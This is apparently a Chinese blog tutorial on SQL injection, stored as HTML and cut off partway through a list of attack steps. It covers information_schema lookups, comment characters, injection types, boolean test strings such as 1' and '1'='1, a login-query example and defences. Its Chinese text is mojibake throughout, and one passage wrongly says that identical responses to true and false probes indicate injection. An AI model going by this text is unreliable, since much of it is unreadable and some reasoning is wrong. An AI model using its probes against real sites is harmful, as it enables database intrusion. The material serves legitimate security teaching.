        <content type="html"><![CDATA[<h1 id="åå­—"><a href="#åå­—" class="headerlink" title="åå­—"></a>åå­—</h1><p>é‡è¦æ•°æ®åº“åï¼šinformation_schema;<br>é‡è¦çš„è¡¨åï¼šcolumns,tables,<br>SCHEMA_NAMEâ€”è®°å½•åº“çš„ä¿¡æ¯ï¼›<br>tableè¡¨å­—æ®µåTABLE_NAMEâ€”â€”è®°å½•è¡¨åï¼›<br>tableè¡¨å­—æ®µåTABLE_SCHEMAâ€”â€”è®°å½•åº“åï¼›<br>columns å­˜å‚¨è¯¥ç”¨æˆ·åˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„åº“åã€æ ‡åå’Œå­—æ®µåã€‚</p><ul><li>é€šè¿‡ infomation_schema æŸ¥è¯¢ www_dvwa_com åº“é‡Œæ‰€æœ‰çš„è¡¨å’Œå­—æ®µ</li></ul><p>select * from information_schema.<code>COLUMNS</code> where TABLE_SCHEMA&#x3D;â€™www_dvwa_comâ€™ï¼›<br>ï¼ˆwhereè¡¨æ¡ä»¶ï¼‰<br>æ•°æ®åº“.è¡¨å è¿™ç§æŸ¥è¯¢æ–¹æ³•æ˜¯æŒ‡å®šæŸä¸ªæ•°æ®åº“æŸä¸ªè¡¨ <code> </code> è¿™ä¸ªç¬¦å·å¯ä»¥å¿½ç•¥ä¸ç”¨ï¼›</p><ul><li>æŸ¥è¯¢æŸä¸ªåº“æŸä¸ªè¡¨çš„å­—æ®µå¯ä»¥è¿™æ ·æŸ¥è¯¢</li></ul><p>select * from information_schema.COLUMNS where</p><p>TABLE_SCHEMA&#x3D;â€™www_dvwa_comâ€™ and TABLE_NAME&#x3D;â€™usersâ€™<br>ï¼ˆâ€™*â€™ä¸ºé€šé…ç¬¦ï¼‰</p><h1 id="sqlæ³¨é‡Šç¬¦"><a href="#sqlæ³¨é‡Šç¬¦" class="headerlink" title="sqlæ³¨é‡Šç¬¦"></a>sqlæ³¨é‡Šç¬¦</h1><p>  â€˜# â€™å•è¡Œæ³¨é‡Š<br>æ³¨æ„ä¸ url ä¸­çš„#åŒºåˆ†ï¼Œå¸¸ç¼–ç ä¸º%23</p><p>â€“ç©ºæ ¼&#x2F;+ å•è¡Œæ³¨é‡Š æ³¨æ„ä¸ºçŸ­çº¿çŸ­çº¿ç©ºæ ¼</p><p>&#x2F;<em>ï¼ˆï¼‰</em>&#x2F; å¤šè¡Œæ³¨é‡Š è‡³å°‘å­˜åœ¨ä¿©å¤„çš„æ³¨å…¥</p><p>&#x2F;* * &#x2F;å¸¸ç”¨æ¥ä½œä¸ºç©ºæ ¼ï¼›</p><h1 id="SQL-æ³¨å…¥åˆ†ç±»"><a href="#SQL-æ³¨å…¥åˆ†ç±»" class="headerlink" title="SQL æ³¨å…¥åˆ†ç±»"></a>SQL æ³¨å…¥åˆ†ç±»</h1><p>SQL æ³¨å…¥åˆ†ç±»ï¼šæŒ‰ SQLMap ä¸­çš„åˆ†ç±»æ¥çœ‹ï¼ŒSQL æ³¨å…¥ç±»å‹æœ‰ä»¥ä¸‹ 5 ç§ï¼š</p><p>UNION query SQL injectionï¼ˆå¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰[[1.5 UNIONè”åˆæ³¨å…¥]]</p><p>Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰å †å æŸ¥è¯¢Boolean-based blind SQL injectionï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰</p><p>Error-based SQL injectionï¼ˆæŠ¥é”™å‹æ³¨å…¥ï¼‰</p><p>Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰</p><h1 id="æ¥å—è¯·æ±‚ç±»å‹åŒºåˆ†"><a href="#æ¥å—è¯·æ±‚ç±»å‹åŒºåˆ†" class="headerlink" title="æ¥å—è¯·æ±‚ç±»å‹åŒºåˆ†"></a>æ¥å—è¯·æ±‚ç±»å‹åŒºåˆ†</h1><p>GET æ³¨å…¥ï¼š</p><p>GET è¯·æ±‚çš„å‚æ•°æ˜¯æ”¾åœ¨ URL é‡Œçš„ï¼ŒGET è¯·æ±‚çš„ URL ä¼ å‚æœ‰é•¿åº¦é™åˆ¶ ä¸­æ–‡éœ€è¦URL ç¼–ç </p><p>POST æ³¨å…¥ï¼š</p><p>POST è¯·æ±‚å‚æ•°æ˜¯æ”¾åœ¨è¯·æ±‚ body é‡Œçš„ï¼Œé•¿åº¦æ²¡æœ‰é™åˆ¶</p><p>COOKIE æ³¨å…¥ï¼š</p><p>cookie å‚æ•°æ”¾åœ¨è¯·æ±‚å¤´ä¿¡æ¯ï¼Œæäº¤çš„æ—¶å€™ æœåŠ¡å™¨ä¼šä»è¯·æ±‚å¤´è·å–</p><h1 id="æ³¨å…¥æ•°æ®ç±»å‹çš„åŒºåˆ†"><a href="#æ³¨å…¥æ•°æ®ç±»å‹çš„åŒºåˆ†" class="headerlink" title="æ³¨å…¥æ•°æ®ç±»å‹çš„åŒºåˆ†"></a>æ³¨å…¥æ•°æ®ç±»å‹çš„åŒºåˆ†</h1><p>int æ•´å‹</p><p>select * from users where id&#x3D;1</p><p>sting å­—ç¬¦å‹</p><p>select * from users where username&#x3D;â€™adminâ€™</p><p>like æœç´¢å‹</p><p>select * from news where title like â€˜%æ ‡é¢˜%â€™</p><h1 id="1-2-SQLæ³¨å…¥åŸç†"><a href="#1-2-SQLæ³¨å…¥åŸç†" class="headerlink" title="1.2 SQLæ³¨å…¥åŸç†"></a>1.2 SQLæ³¨å…¥åŸç†</h1><p>æ„é€ ä¸€æ¡ç²¾å·§çš„è¯­å¥å¾—åˆ°è‡ªå·±æƒ³è¦çš„ä¿¡æ¯ï¼›<br>SQL æ³¨å…¥æ¼æ´çš„äº§ç”Ÿéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶</p><p>å‚æ•°ç”¨æˆ·å¯æ§ï¼šä»å‰ç«¯ä¼ ç»™åç«¯çš„å‚æ•°å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„</p><p>å‚æ•°å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼šä¼ å…¥çš„å‚æ•°æ‹¼æ¥åˆ° SQL è¯­å¥ï¼Œä¸”å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚<br>å½“ä¼ å…¥å‚æ•°ä¸º 1â€™çš„æ—¶å€™,åœ¨æ•°æ®åº“æ‰§è¡Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p>select * from users where id&#x3D;1â€™</p><p>æ­¤ SQL è¯­å¥ä¸ç¬¦åˆè¯­æ³•è§„åˆ™å°±ä¼šæŠ¥é”™ã€‚</p><p>You have an error in your SQL syntax; check the manual that corresponds to your</p><p>MySQL server version for the right syntax to use near â€˜â€™â€™ at line 1</p><p>å½“ä¼ å…¥å‚æ•°ä¸º 1 and 1&#x3D;1 æ—¶</p><p>select * from users where id&#x3D;1 and 1&#x3D;1</p><p>å› ä¸º 1&#x3D;1 ä¸ºçœŸ id&#x3D;1 ä¹Ÿæ˜¯çœŸ and ä¸¤è¾¹å‡ä¸ºçœŸ æ‰€ä»¥é¡µé¢ä¼šè¿”å› id&#x3D;1 çš„ç»“æœã€‚</p><p>å¦‚æœä¼ å…¥å‚æ•°ä¸º 1 and 1&#x3D;2 æ—¶</p><p>å› ä¸º 1&#x3D;2 ä¸ºå‡ id&#x3D;1 ä¸ºçœŸ and ä¸¤è¾¹æœ‰ä¸€ä¸ªä¸ºå‡ï¼Œæ‰€ä»¥é¡µé¢è¿”å›ä¸ id&#x3D;1 ä¸ä¸€æ ·çš„ç»“æœã€‚</p><p>ç”±æ­¤å¯ä»¥åˆæ­¥åˆ¤æ–­å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æ‹¼æ¥ SQL æ”»å‡»è¯­å¥ï¼Œ</p><p>è¿›è¡Œæ”»å‡»ï¼Œè‡´ä½¿ä¿¡æ¯æ³„éœ²ï¼Œç”šè‡³è·å–æœåŠ¡å™¨æƒé™ã€‚</p><h1 id="1-3-åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥"><a href="#1-3-åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥" class="headerlink" title="1.3 åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥"></a>1.3 åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥</h1><p>å›æ˜¾æ˜¯æŒ‡é¡µé¢æœ‰æ•°æ® ä¿¡æ¯è¿”å›</p><p>id &#x3D;1 and 1&#x3D;1</p><p>id &#x3D; 1 and 1&#x3D;2</p><p>id &#x3D; 1 or 1&#x3D;1</p><p>id &#x3D; â€˜1â€™ or â€˜1â€™&#x3D;â€™1â€™</p><p>id&#x3D;â€ 1 â€œor â€œ1â€&#x3D;â€1â€</p><p>æ— å›æ˜¾æ˜¯æŒ‡ æ ¹æ®è¾“å…¥çš„è¯­å¥ é¡µé¢æ²¡æœ‰ä»»ä½•å˜åŒ–,æˆ–è€…æ²¡æœ‰æ•°æ®åº“ä¸­çš„å†…å®¹æ˜¾ç¤º</p><p>åˆ°ç½‘é¡µä¸­</p><p>åœ¨ SQL ç›²æ³¨ï¼ˆBlind SQL Injectionï¼‰ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡è§‚å¯Ÿé¡µé¢çš„å“åº”å·®å¼‚æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚ä½ æåˆ°çš„ä¸¤ä¸ªæµ‹è¯•è¯­å¥ <code>1&#39;and &#39;1&#39;=&#39;1</code> å’Œ <code>1&#39;and &#39;1&#39;=&#39;2</code> æ˜¯å…¸å‹çš„ç”¨äºåˆ¤æ–­ç›²æ³¨çš„æµ‹è¯•è¯­å¥ã€‚ä¸‹é¢æ¥è¯¦ç»†è§£é‡Šä¸ºä»€ä¹ˆè¿™ä¸¤ä¸ªè¯­å¥çš„å“åº”ä¼šä¸ä¸€æ ·ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡å®ƒä»¬åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚</p><h3 id="1-SQL-æ³¨å…¥çš„åŸºæœ¬åŸç†"><a href="#1-SQL-æ³¨å…¥çš„åŸºæœ¬åŸç†" class="headerlink" title="1. SQL æ³¨å…¥çš„åŸºæœ¬åŸç†"></a>1. <strong>SQL æ³¨å…¥çš„åŸºæœ¬åŸç†</strong></h3><p>SQL æ³¨å…¥æ”»å‡»æ˜¯é€šè¿‡åœ¨ç”¨æˆ·è¾“å…¥ä¸­æ’å…¥æ¶æ„çš„ SQL ä»£ç ï¼Œä»è€Œå¹²æ‰°æ•°æ®åº“çš„æ­£å¸¸æŸ¥è¯¢é€»è¾‘ã€‚ç›²æ³¨æ˜¯ä¸€ç§ç‰¹æ®Šçš„ SQL æ³¨å…¥æ”»å‡»ï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥çœ‹åˆ°é”™è¯¯ä¿¡æ¯æˆ–æŸ¥è¯¢ç»“æœï¼Œåªèƒ½é€šè¿‡é¡µé¢çš„å“åº”ï¼ˆå¦‚é¡µé¢æ˜¯å¦åŠ è½½æˆåŠŸã€åŠ è½½æ—¶é—´ç­‰ï¼‰æ¥åˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸã€‚</p><h3 id="2-æµ‹è¯•è¯­å¥çš„é€»è¾‘"><a href="#2-æµ‹è¯•è¯­å¥çš„é€»è¾‘" class="headerlink" title="2. æµ‹è¯•è¯­å¥çš„é€»è¾‘"></a>2. <strong>æµ‹è¯•è¯­å¥çš„é€»è¾‘</strong></h3><h4 id="æµ‹è¯•è¯­å¥-1-1-and-1-1"><a href="#æµ‹è¯•è¯­å¥-1-1-and-1-1" class="headerlink" title="æµ‹è¯•è¯­å¥ 1: 1&#39;and &#39;1&#39;=&#39;1"></a>æµ‹è¯•è¯­å¥ 1: <code>1&#39;and &#39;1&#39;=&#39;1</code></h4><ul><li><p><strong>é€»è¾‘è§£é‡Š</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¯­å¥çš„é€»è¾‘æ˜¯ï¼š</p><ul><li><code>1&#39;</code>ï¼šé—­åˆåŸå§‹ SQL è¯­å¥ä¸­çš„å•å¼•å·ã€‚</li><li><code>AND &#39;1&#39;=&#39;1</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ’çœŸçš„æ¡ä»¶ï¼Œå› ä¸º <code>&#39;1&#39;=&#39;1</code> æ°¸è¿œæˆç«‹ã€‚</li></ul><p>å¦‚æœåŸå§‹ SQL è¯­å¥æ˜¯ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>æ³¨å…¥åçš„è¯­å¥å˜ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¯­å¥çš„é€»è¾‘æ²¡æœ‰æ”¹å˜ï¼Œä»ç„¶ä¼šæ­£å¸¸æ‰§è¡Œï¼Œé¡µé¢åº”è¯¥ä¼šæ­£å¸¸åŠ è½½ã€‚</p></li></ul><h4 id="æµ‹è¯•è¯­å¥-2-1-and-1-2"><a href="#æµ‹è¯•è¯­å¥-2-1-and-1-2" class="headerlink" title="æµ‹è¯•è¯­å¥ 2: 1&#39;and &#39;1&#39;=&#39;2"></a>æµ‹è¯•è¯­å¥ 2: <code>1&#39;and &#39;1&#39;=&#39;2</code></h4><ul><li><p><strong>é€»è¾‘è§£é‡Š</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¯­å¥çš„é€»è¾‘æ˜¯ï¼š</p><ul><li><code>1&#39;</code>ï¼šé—­åˆåŸå§‹ SQL è¯­å¥ä¸­çš„å•å¼•å·ã€‚</li><li><code>AND &#39;1&#39;=&#39;2</code>ï¼šè¿™æ˜¯ä¸€ä¸ªæ’å‡çš„æ¡ä»¶ï¼Œå› ä¸º <code>&#39;1&#39;=&#39;2</code> æ°¸è¿œä¸æˆç«‹ã€‚</li></ul><p>å¦‚æœåŸå§‹ SQL è¯­å¥æ˜¯ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure><p>æ³¨å…¥åçš„è¯­å¥å˜ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¯­å¥çš„é€»è¾‘è¢«ç ´åï¼Œå› ä¸º <code>&#39;1&#39;=&#39;2</code> æ°¸è¿œä¸æˆç«‹ï¼Œæ‰€ä»¥æ•´ä¸ªæŸ¥è¯¢ä¸ä¼šè¿”å›ä»»ä½•ç»“æœï¼Œé¡µé¢å¯èƒ½ä¼šæ˜¾ç¤ºé”™è¯¯æˆ–åŠ è½½å¤±è´¥ã€‚</p></li></ul><h3 id="3-ä¸ºä»€ä¹ˆé¡µé¢å“åº”ä¸ä¸€æ ·"><a href="#3-ä¸ºä»€ä¹ˆé¡µé¢å“åº”ä¸ä¸€æ ·" class="headerlink" title="3. ä¸ºä»€ä¹ˆé¡µé¢å“åº”ä¸ä¸€æ ·"></a>3. <strong>ä¸ºä»€ä¹ˆé¡µé¢å“åº”ä¸ä¸€æ ·</strong></h3><ul><li>**<code>1&#39;and &#39;1&#39;=&#39;1</code>**ï¼š<ul><li>é¡µé¢æ­£å¸¸åŠ è½½ï¼Œå› ä¸ºæ³¨å…¥çš„æ¡ä»¶æ˜¯æ’çœŸçš„ï¼Œä¸ä¼šå½±å“åŸå§‹æŸ¥è¯¢çš„é€»è¾‘ã€‚</li></ul></li><li>**<code>1&#39;and &#39;1&#39;=&#39;2</code>**ï¼š<ul><li>é¡µé¢åŠ è½½å¤±è´¥æˆ–æ˜¾ç¤ºé”™è¯¯ï¼Œå› ä¸ºæ³¨å…¥çš„æ¡ä»¶æ˜¯æ’å‡çš„ï¼Œå¯¼è‡´æŸ¥è¯¢æ— æ³•æ­£å¸¸æ‰§è¡Œã€‚</li></ul></li></ul><h3 id="4-å¦‚ä½•åˆ¤æ–­-SQL-æ³¨å…¥æ¼æ´"><a href="#4-å¦‚ä½•åˆ¤æ–­-SQL-æ³¨å…¥æ¼æ´" class="headerlink" title="4. å¦‚ä½•åˆ¤æ–­ SQL æ³¨å…¥æ¼æ´"></a>4. <strong>å¦‚ä½•åˆ¤æ–­ SQL æ³¨å…¥æ¼æ´</strong></h3><p>é€šè¿‡è§‚å¯Ÿé¡µé¢çš„å“åº”å·®å¼‚ï¼Œå¯ä»¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ï¼š</p><ul><li>å¦‚æœ <code>1&#39;and &#39;1&#39;=&#39;1</code> å’Œ <code>1&#39;and &#39;1&#39;=&#39;2</code> çš„é¡µé¢å“åº”ä¸€æ ·ï¼ˆä¾‹å¦‚ï¼Œéƒ½æ­£å¸¸åŠ è½½æˆ–éƒ½æ˜¾ç¤ºé”™è¯¯ï¼‰ï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚</li><li>å¦‚æœ <code>1&#39;and &#39;1&#39;=&#39;1</code> å’Œ <code>1&#39;and &#39;1&#39;=&#39;2</code> çš„é¡µé¢å“åº”ä¸ä¸€æ ·ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ­£å¸¸åŠ è½½ï¼Œä¸€ä¸ªæ˜¾ç¤ºé”™è¯¯ï¼‰ï¼Œé‚£ä¹ˆå‡ ä¹å¯ä»¥ç¡®å®šå­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚</li><li><h4 id="ä¸ºä»€ä¹ˆé€šè¿‡é¡µé¢å“åº”å·®å¼‚æ¥åˆ¤æ–­"><a href="#ä¸ºä»€ä¹ˆé€šè¿‡é¡µé¢å“åº”å·®å¼‚æ¥åˆ¤æ–­" class="headerlink" title="ä¸ºä»€ä¹ˆé€šè¿‡é¡µé¢å“åº”å·®å¼‚æ¥åˆ¤æ–­"></a><strong>ä¸ºä»€ä¹ˆé€šè¿‡é¡µé¢å“åº”å·®å¼‚æ¥åˆ¤æ–­</strong></h4></li></ul><h5 id="æƒ…å†µ-1ï¼šé¡µé¢å“åº”ä¸€æ ·"><a href="#æƒ…å†µ-1ï¼šé¡µé¢å“åº”ä¸€æ ·" class="headerlink" title="æƒ…å†µ 1ï¼šé¡µé¢å“åº”ä¸€æ ·"></a><strong>æƒ…å†µ 1ï¼šé¡µé¢å“åº”ä¸€æ ·</strong></h5><p>å¦‚æœ <code>1&#39;and &#39;1&#39;=&#39;1</code> å’Œ <code>1&#39;and &#39;1&#39;=&#39;2</code> çš„é¡µé¢å“åº”ä¸€æ ·ï¼ˆä¾‹å¦‚ï¼Œéƒ½æ­£å¸¸åŠ è½½æˆ–éƒ½æ˜¾ç¤ºé”™è¯¯ï¼‰ï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚åŸå› å¦‚ä¸‹ï¼š</p><ul><li><p><strong>æ­£å¸¸åŠ è½½çš„æƒ…å†µ</strong>ï¼š</p><ul><li>å¦‚æœä¸¤ä¸ªè¯­å¥éƒ½æ­£å¸¸åŠ è½½ï¼Œè¯´æ˜æ³¨å…¥çš„ SQL ä»£ç è¢«æ­£ç¡®è§£æï¼Œä½†æ²¡æœ‰æ”¹å˜æŸ¥è¯¢çš„é€»è¾‘ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºåº”ç”¨ç¨‹åºå¯¹æ³¨å…¥çš„ä»£ç è¿›è¡Œäº†æŸç§å¤„ç†ï¼ˆä¾‹å¦‚ï¼Œè¿‡æ»¤æˆ–è½¬ä¹‰ï¼‰ï¼Œä½†æ²¡æœ‰å®Œå…¨é˜»æ­¢æ³¨å…¥ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œè™½ç„¶æ³¨å…¥æ²¡æœ‰ç›´æ¥å¯¼è‡´é¡µé¢å¼‚å¸¸ï¼Œä½†ä»ç„¶å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œéœ€è¦è¿›ä¸€æ­¥æµ‹è¯•ã€‚</li></ul></li><li><p><strong>éƒ½æ˜¾ç¤ºé”™è¯¯çš„æƒ…å†µ</strong>ï¼š</p><ul><li>å¦‚æœä¸¤ä¸ªè¯­å¥éƒ½æ˜¾ç¤ºé”™è¯¯ï¼Œè¯´æ˜æ³¨å…¥çš„ SQL ä»£ç è¢«æ­£ç¡®è§£æï¼Œä½†åº”ç”¨ç¨‹åºæ²¡æœ‰æ­£ç¡®å¤„ç†é”™è¯¯ã€‚è¿™å¯èƒ½æ˜¯å› ä¸ºåº”ç”¨ç¨‹åºæ²¡æœ‰å¯¹é”™è¯¯è¿›è¡Œé€‚å½“çš„éšè—æˆ–å¤„ç†ï¼Œå¯¼è‡´æ³¨å…¥çš„ä»£ç å¼•å‘äº†é”™è¯¯ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œè™½ç„¶é¡µé¢æ˜¾ç¤ºé”™è¯¯ï¼Œä½†ä»ç„¶è¯´æ˜æ³¨å…¥çš„ä»£ç è¢«æ­£ç¡®è§£æï¼Œå¯èƒ½å­˜åœ¨æ¼æ´ã€‚</li></ul></li></ul><h5 id="æƒ…å†µ-2ï¼šé¡µé¢å“åº”ä¸ä¸€æ ·"><a href="#æƒ…å†µ-2ï¼šé¡µé¢å“åº”ä¸ä¸€æ ·" class="headerlink" title="æƒ…å†µ 2ï¼šé¡µé¢å“åº”ä¸ä¸€æ ·"></a><strong>æƒ…å†µ 2ï¼šé¡µé¢å“åº”ä¸ä¸€æ ·</strong></h5><p>å¦‚æœ <code>1&#39;and &#39;1&#39;=&#39;1</code> å’Œ <code>1&#39;and &#39;1&#39;=&#39;2</code> çš„é¡µé¢å“åº”ä¸ä¸€æ ·ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ­£å¸¸åŠ è½½ï¼Œä¸€ä¸ªæ˜¾ç¤ºé”™è¯¯ï¼‰ï¼Œé‚£ä¹ˆå‡ ä¹å¯ä»¥ç¡®å®šå­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚åŸå› å¦‚ä¸‹ï¼š</p><ul><li><p><strong>æ­£å¸¸åŠ è½½ vs. æ˜¾ç¤ºé”™è¯¯</strong>ï¼š</p><ul><li>å¦‚æœ <code>1&#39;and &#39;1&#39;=&#39;1</code> æ­£å¸¸åŠ è½½ï¼Œè€Œ <code>1&#39;and &#39;1&#39;=&#39;2</code> æ˜¾ç¤ºé”™è¯¯ï¼Œè¯´æ˜æ³¨å…¥çš„ SQL ä»£ç è¢«æ­£ç¡®è§£æï¼Œå¹¶ä¸”æ”¹å˜äº†æŸ¥è¯¢çš„é€»è¾‘ã€‚<code>&#39;1&#39;=&#39;1</code> æ˜¯æ’çœŸæ¡ä»¶ï¼Œä¸ä¼šå½±å“æŸ¥è¯¢ç»“æœï¼›è€Œ <code>&#39;1&#39;=&#39;2</code> æ˜¯æ’å‡æ¡ä»¶ï¼Œå¯¼è‡´æŸ¥è¯¢å¤±è´¥ã€‚è¿™ç§å·®å¼‚è¡¨æ˜æ³¨å…¥çš„ä»£ç è¢«æ­£ç¡®æ‰§è¡Œï¼Œä¸”å¯¹æŸ¥è¯¢ç»“æœäº§ç”Ÿäº†ç›´æ¥å½±å“ï¼Œå› æ­¤å¯ä»¥ç¡®å®šå­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚</li></ul></li></ul><h3 id="5-ç¤ºä¾‹"><a href="#5-ç¤ºä¾‹" class="headerlink" title="5. ç¤ºä¾‹"></a>5. <strong>ç¤ºä¾‹</strong></h3><p>å‡è®¾æœ‰ä¸€ä¸ªç”¨æˆ·ç™»å½•é¡µé¢ï¼Œç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ä¼šè¢«ç”¨äºä»¥ä¸‹ SQL æŸ¥è¯¢ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ”»å‡»è€…è¾“å…¥ï¼š</p><ul><li>**<code>1&#39;and &#39;1&#39;=&#39;1</code>**ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>é¡µé¢æ­£å¸¸åŠ è½½ã€‚</li><li>**<code>1&#39;and &#39;1&#39;=&#39;2</code>**ï¼š<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>é¡µé¢åŠ è½½å¤±è´¥æˆ–æ˜¾ç¤ºé”™è¯¯ã€‚</li></ul><p>é€šè¿‡è¿™ç§å·®å¼‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ¤æ–­å‡ºé¡µé¢å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚</p><h3 id="6-é˜²èŒƒæªæ–½"><a href="#6-é˜²èŒƒæªæ–½" class="headerlink" title="6. é˜²èŒƒæªæ–½"></a>6. <strong>é˜²èŒƒæªæ–½</strong></h3><p>ä¸ºäº†é¿å… SQL æ³¨å…¥æ¼æ´ï¼Œå»ºè®®é‡‡å–ä»¥ä¸‹æªæ–½ï¼š</p><ul><li><strong>ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢</strong>ï¼šè¿™æ˜¯æœ€æœ‰æ•ˆçš„é˜²å¾¡æ–¹æ³•ã€‚é€šè¿‡å‚æ•°åŒ–æŸ¥è¯¢ï¼Œå¯ä»¥ç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸ä¼šè¢«å½“ä½œ SQL ä»£ç æ‰§è¡Œã€‚</li><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç¡®ä¿è¾“å…¥ç¬¦åˆé¢„æœŸæ ¼å¼ã€‚</li><li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šé™åˆ¶æ•°æ®åº“ç”¨æˆ·çš„æƒé™ï¼Œåªæˆäºˆå¿…è¦çš„æƒé™ï¼Œé¿å…æ”»å‡»è€…è·å–è¿‡å¤šä¿¡æ¯ã€‚</li><li><strong>å¯ç”¨ WAFï¼ˆWeb åº”ç”¨é˜²ç«å¢™ï¼‰</strong>ï¼šWAF å¯ä»¥æ£€æµ‹å’Œé˜»æ­¢å¸¸è§çš„ SQL æ³¨å…¥æ”»å‡»ã€‚</li></ul><h1 id="1-4-æ³¨å…¥æµç¨‹"><a href="#1-4-æ³¨å…¥æµç¨‹" class="headerlink" title="1.4 æ³¨å…¥æµç¨‹"></a>1.4 æ³¨å…¥æµç¨‹</h1><ul><li><p>æ˜¯å¦å­˜åœ¨æ³¨å…¥å¹¶ä¸”åˆ¤æ–­æ³¨å…¥ç±»å‹</p></li><li><p>åˆ¤æ–­å­—æ®µæ•°   order by     group by</p></li><li><p>ç¡®å®šå›æ˜¾ç‚¹  union select 1,2</p></li><li><p>æŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯  @@version   